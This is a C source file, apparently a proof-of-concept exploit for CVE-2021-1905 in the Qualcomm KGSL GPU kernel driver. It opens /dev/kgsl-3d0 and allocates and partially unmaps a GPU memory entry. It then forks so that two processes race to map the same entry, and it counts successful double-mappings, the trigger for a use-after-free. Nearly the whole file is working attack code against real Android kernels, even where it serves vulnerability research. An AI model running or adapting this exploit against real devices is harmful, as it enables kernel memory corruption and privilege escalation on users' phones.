/*
 * kgsl_race_uaf.c - CVE-2021-1905 condition 2: race two processes mapping the
 * same (armed) struct kgsl_mem_entry.
 *
 *  per round:
 *    alloc A (USE_CPU_MAP 0x3000); mmap at H1; split+close -> useraddr = 0
 *    fork(); pipe-sync; parent mmaps A at H2 while child mmaps A at H3
 *    collect both results; detect double-success / error patterns; cleanup
 *
 * Build: zig cc -target aarch64-linux-musl -nostdlib -static -ffreestanding -fno-builtin -O2 -Wl,-e,_start -o kgsl_race_uaf kgsl_race_uaf.c
 */
typedef unsigned char u8; typedef unsigned int u32; typedef unsigned long u64; typedef long s64;
#define SYS_openat 56
#define SYS_ioctl 29
#define SYS_write 64
#define SYS_read 63
#define SYS_exit 93
#define SYS_close 57
#define SYS_mmap 222
#define SYS_munmap 215
#define SYS_pipe2 59
#define SYS_fork 220
#define SYS_wait4 260
#define SYS_sched_yield 124
static inline s64 sys1(long n,s64 a){register s64 x0 __asm__("x0")=a;register s64 x8 __asm__("x8")=n;__asm__ volatile("svc #0":"+r"(x0):"r"(x8):"memory");return x0;}
static inline s64 sys2(long n,s64 a,s64 b){register s64 x0 __asm__("x0")=a;register s64 x1 __asm__("x1")=b;register s64 x8 __asm__("x8")=n;__asm__ volatile("svc #0":"+r"(x0):"r"(x1),"r"(x8):"memory");return x0;}
static inline s64 sys3(long n,s64 a,s64 b,s64 c){register s64 x0 __asm__("x0")=a;register s64 x1 __asm__("x1")=b;register s64 x2 __asm__("x2")=c;register s64 x8 __asm__("x8")=n;__asm__ volatile("svc #0":"+r"(x0):"r"(x1),"r"(x2),"r"(x8):"memory");return x0;}
static inline s64 sys4(long n,s64 a,s64 b,s64 c,s64 d){register s64 x0 __asm__("x0")=a;register s64 x1 __asm__("x1")=b;register s64 x2 __asm__("x2")=c;register s64 x3 __asm__("x3")=d;register s64 x8 __asm__("x8")=n;__asm__ volatile("svc #0":"+r"(x0):"r"(x1),"r"(x2),"r"(x3),"r"(x8):"memory");return x0;}
static inline s64 sys6(long n,s64 a,s64 b,s64 c,s64 d,s64 e,s64 f){register s64 x0 __asm__("x0")=a;register s64 x1 __asm__("x1")=b;register s64 x2 __asm__("x2")=c;register s64 x3 __asm__("x3")=d;register s64 x4 __asm__("x4")=e;register s64 x5 __asm__("x5")=f;register s64 x8 __asm__("x8")=n;__asm__ volatile("svc #0":"+r"(x0):"r"(x1),"r"(x2),"r"(x3),"r"(x4),"r"(x5),"r"(x8):"memory");return x0;}
static int slen(const char*s){int n=0;while(s[n])n++;return n;}
static void out(const char*s){sys3(SYS_write,1,(s64)s,slen(s));}
static void outhex(u64 v){char b[19];b[0]='0';b[1]='x';for(int i=0;i<16;i++){int n=(v>>((15-i)*4))&0xf;b[2+i]=n<10?'0'+n:'a'+n-10;}b[18]=0;out(b);}
static void outdec(s64 v){char b[24];int i=23;b[i--]=0;int neg=v<0;if(neg)v=-v;if(v==0)b[i--]='0';while(v>0){b[i--]='0'+(v%10);v/=10;}if(neg)b[i--]='-';out(&b[i+1]);}
#define _IOC_WRITE 1u
#define _IOC_READ 2u
#define IOC(dir,type,nr,size) (((dir)<<30)|((size)<<16)|((type)<<8)|(nr))
#define KGSL_MAGIC 0x09
struct kgsl_gpumem_alloc_id{u32 id;u32 flags;u64 size;u64 mmapsize;u64 gpuaddr;u64 pad[2];};
#define IOCTL_GPUMEM_ALLOC_ID IOC(_IOC_READ|_IOC_WRITE,KGSL_MAGIC,0x34,sizeof(struct kgsl_gpumem_alloc_id))
struct kgsl_gpumem_free_id{u32 id;u32 pad;};
#define IOCTL_GPUMEM_FREE_ID IOC(_IOC_READ|_IOC_WRITE,KGSL_MAGIC,0x35,sizeof(struct kgsl_gpumem_free_id))
#define KGSL_MEMFLAGS_USE_CPU_MAP 0x10000000ull
#define ASZ 0x3000ull
#ifndef ROUNDS
#define ROUNDS 300
#endif

static long g_fd; static u32 g_aid; static u64 g_fsz, g_h1, g_h2, g_h3;
static int g_pipe_r, g_pipe_w;
static volatile u64* g_shm;
char g_stack[0x8000] __attribute__((aligned(16), used));
static long g_p_res, g_c_res;

static s64 alloc_a(void){
    struct kgsl_gpumem_alloc_id a; for(u64 i=0;i<sizeof(a);i++)((u8*)&a)[i]=0;
    a.size=ASZ; a.flags=(u32)KGSL_MEMFLAGS_USE_CPU_MAP;
    long r=sys3(SYS_ioctl,g_fd,IOCTL_GPUMEM_ALLOC_ID,(s64)&a);
    if(r) return r;
    g_aid=a.id; g_fsz=a.mmapsize?a.mmapsize:ASZ;
    return 0;
}
void child_entry(void) __attribute__((used));
__attribute__((naked, used)) long raw_fork(void){
    __asm__ volatile(
        "mov x0, #17\n"
        "adrp x1, g_stack\n"
        "add x1, x1, #:lo12:g_stack\n"
        "add x1, x1, #0x8000\n"
        "mov x2, xzr\n"
        "mov x3, xzr\n"
        "mov x4, xzr\n"
        "mov x8, #220\n"
        "svc #0\n"
        "cbnz x0, 1f\n"
        "bl child_entry\n"
        "mov x0, #0\n"
        "mov x8, #93\n"
        "svc #0\n"
        "1: ret\n");
}
void child_entry(void){
    out("[C] child entered\n");
    g_shm[0]=1;                       /* ready */
    while(g_shm[1]==0){}              /* spin for go */
    s64 m=sys6(SYS_mmap,(s64)g_h3,g_fsz,3,1,g_fd,(s64)((u64)g_aid<<12));
    g_shm[2]=(u64)m;
    sys1(SYS_exit,0);
}
void _start(void){
    out("[*] kgsl_race_uaf (CVE-2021-1905 condition 2)\n");
    g_fd=sys4(SYS_openat,-100,(s64)"/dev/kgsl-3d0",2,0);
    out("[1] open = ");outdec(g_fd);out("\n");
    if(g_fd<0){sys3(SYS_exit,1,0,0);return;}

    int wins=0, both=0, errs=0;
    for(int round=1; round<=ROUNDS; round++){
        if(alloc_a()) break;
        /* mmap #1 at H1 and arm (clear useraddr) */
        g_h1=0x60000000ull + (u64)(round&0xff)*0x10000ull;
        g_h2=0x70000000ull + (u64)(round&0xff)*0x10000ull;
        g_h3=0x50000000ull + (u64)(round&0xff)*0x10000ull;
        s64 m1=sys6(SYS_mmap,(s64)g_h1,g_fsz,3,1,g_fd,(s64)((u64)g_aid<<12));
        if(m1<=0){ struct kgsl_gpumem_free_id f; f.id=g_aid; f.pad=0; sys3(SYS_ioctl,g_fd,IOCTL_GPUMEM_FREE_ID,(s64)&f); continue; }
        g_h1=(u64)m1;
        sys2(SYS_munmap,(s64)(g_h1+0x1000),0x1000);
        sys2(SYS_munmap,(s64)(g_h1+0x2000),(s64)(g_fsz-0x2000));

        int pfd[2]; sys2(SYS_pipe2,(s64)pfd,0); g_pipe_r=pfd[0]; g_pipe_w=pfd[1];
        g_shm=(volatile u64*)sys6(SYS_mmap,0,0x1000,3,0x21,-1,0); /* MAP_SHARED|ANON */
        if((s64)g_shm<=0){ out("[!] shm\n"); break; }
        g_shm[0]=0; g_shm[1]=0; g_shm[2]=0;
        long pid=raw_fork();
        if(pid==0){ /* child path (handled in child_entry) */ }
        if(pid>0){
            while(g_shm[0]==0){}      /* wait child ready */
            g_shm[1]=1;               /* go! */
            g_p_res=sys6(SYS_mmap,(s64)g_h2,g_fsz,3,1,g_fd,(s64)((u64)g_aid<<12));
            g_c_res=(s64)g_shm[2];
            sys4(SYS_wait4,pid,0,0,0);
            if(g_p_res>0 && g_c_res>0){ both++; wins++;
                out("[R");outdec(round);out("] BOTH MAPPED: parent=");outhex((u64)g_p_res);out(" child=");outhex((u64)g_c_res);out("\n");
            } else if(g_p_res<0 && g_c_res<0){ errs++;
                if(round<=5){ out("[R");outdec(round);out("] both failed p=");outdec(g_p_res);out(" c=");outdec(g_c_res);out("\n"); }
            }
            if(g_p_res>0) sys2(SYS_munmap,(s64)g_p_res,g_fsz);
        } else {
            out("[!] fork failed\n"); break;
        }
        sys2(SYS_munmap,(s64)g_h1,0x1000);
        struct kgsl_gpumem_free_id f; f.id=g_aid; f.pad=0;
        sys3(SYS_ioctl,g_fd,IOCTL_GPUMEM_FREE_ID,(s64)&f);
        sys1(SYS_close,g_pipe_r); sys1(SYS_close,g_pipe_w);
    }
    out("[*] done: rounds=");outdec(ROUNDS);out(" double-map wins=");outdec(wins);out(" both-failed=");outdec(errs);out("\n");
    sys3(SYS_close,g_fd,0,0);
    sys3(SYS_exit,0,0,0);
}
